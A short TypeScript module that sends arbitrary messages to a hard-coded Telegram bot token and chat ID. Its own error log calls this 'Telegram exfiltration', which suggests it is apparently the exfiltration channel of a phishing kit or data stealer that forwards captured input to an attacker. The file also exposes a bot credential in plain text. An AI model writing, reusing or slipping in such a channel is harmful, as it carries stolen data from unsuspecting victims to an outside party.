const BOT_TOKEN = "8759120791:AAHhr_D0QNT1KuwbK8xBJA7oPMVbpPo57_c";
const CHAT_ID = "6166440263";

export const sendMessageToTelegram = async (message: string) => {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Telegram exfiltration failed:', error);
    return false;
  }
};
